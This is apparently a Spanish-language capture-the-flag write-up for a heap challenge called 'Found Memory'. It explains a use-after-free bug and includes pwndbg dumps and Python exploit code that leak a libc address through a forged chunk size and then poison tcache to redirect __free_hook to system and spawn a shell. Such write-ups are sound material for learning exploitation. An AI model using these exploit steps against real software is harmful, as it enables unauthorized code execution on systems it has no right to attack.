# Found Memory

Este reto es similar a Lost Memory. Podemos:
- Reservar chunks de 0x30 bytes en el heap
- Liberarlos
- Leerlos
- Escribirlos

Al liberarse memoria no se asigna NULL a los punteros asi que tenemos una vulnerabilidad Use After Free.

### libc leak

Se liberan tres chunks y se sobreescribe el fd del segundo en el tcache para que apunte a la cabecera de chunk1
```
 tcache -> chunk2 -> chunk1 -> chunk0
                  fd        fd
                            -> chunk1 (header)
```

Dump de pwndbg:
```
tcachebins
0x40 [  3]: 0x5593dad4c320 —▸ 0x5593dad4c2e0 —▸ 0x5593dad4c2a0 ◂— 0

tcachebins
0x40 [  3]: 0x5593dad4c320 —▸ 0x5593dad4c2e0 —▸ 0x5593dad4c2d0 ◂— 0

pwndbg> x/20xw   0x5593dad4c2a0
0x5593dad4c2a0: 0x00000000      0x00000000      0xdad4c010      0x00005593
0x5593dad4c2b0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5593dad4c2c0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5593dad4c2d0: 0x00000000      0x00000000      0x00000041      0x00000000
0x5593dad4c2e0: 0xdad4c2d0      0x00005593      0xdad4c010      0x00005593
```


Se reserva para obtener un puntero a la cabecera de chunk1 y se escribe en el campo `size` un valor grande (0x441). Cuando este chunk se libere sera enviado a `unsorted bin` por ser demasiado grande para `tcache`.

El primer chunk en unsorted bin tiene su fd y bk apuntando a direcciones de libc:
```
unsortedbin
all: 0x5607e59042d0 —▸ 0x7f60399d8be0 ◂— 0x5607e59042d0
```

``` python
free(0)
free(1)
free(2)
edit(1, p8(0xd0)) 
alloc() # c2 
alloc() # c1 
alloc() # c1 
edit(2, p64(0)+p64(0x441))
free(1) 
view(1)
leak = u64(r.recv(8))
```


### ret2libc

Finalmente podemos hacer un ret2libc usando el hook `__free_hook` que es llamado en lugar de `free` si no es nulo. 

Apuntando `__free_hook` a `system` y poniendo el argumento `/bin/sh\0` en el chunk a liberar conseguimos llamar a `system("/bin/sh")`

Estado del tcache durante el proceso:
```
 tcache -> chunk20 -> chunk19 -> __free_hook (puntero a system)
                  fd         fd
```

```python
#tcache poison to get a shell by overwriting the free hook ( < glibc 2.31 )
free(19)
free(20)
edit(21, b"/bin/sh\0")
edit(20, p64(libc.sym.__free_hook))
alloc()
alloc()
edit(19, p64(libc.sym.system))
rcu(b">")
#shell
sl(b"2")
sla(b"free:",bc(21))
#========= interactive ====================
r.interactive()
```

